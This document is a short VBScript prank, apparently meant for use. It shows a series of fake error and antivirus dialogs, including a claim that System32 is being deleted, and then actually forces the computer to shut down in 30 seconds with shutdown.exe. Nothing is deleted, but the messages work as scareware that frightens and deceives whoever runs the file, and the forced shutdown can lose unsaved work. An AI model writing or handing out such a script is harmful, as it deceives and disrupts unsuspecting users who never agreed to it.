x=msgbox("Error 404: File Not Found. Try To Fix ?",4+48,"Error")
x=msgbox("Detecting Issue.... Please Wait...",2+64,"Scan")
x=msgbox("Scan Completed. Issue Found. Fix the Problem?",4+64,"Scan")
x=msgbox("Could Not Fix the Problem.",5+48,"Error")
x=msgbox("Virus Detected!! Scan and delete the virus ?",0+16,"Warning")
x=msgbox("Deleting Virus...",0+16,"Scan")
x=msgbox("Deleting Virus: 3% done...",0+32,"Please Wait")
x=msgbox("Deleting Virus: 46% done...",0+32,"Please Wait")
x=msgbox("Deleting Virus: 97% done...",0+32,"Please Wait")
x=msgbox("Deleting Virus: 99% done...",0+32,"Please Wait")
x=msgbox("Error Deleting Virus. Try advance Scan?",5+16,"Error")
x=msgbox("ERROR 41: Malicious Files Found. Click Yes To Delete Files.",4+48,"Title")
x=msgbox("Deleting System32...",2+32,"Please Wait...")
x=msgbox("Deletion Successful. Click Ok to Reboot",0+64,"Done")
x=msgbox("Rebooting....",,"Reboot")
set shell=CreateObject("Wscript.shell")
shell.run"shutdown.exe -s -t 30"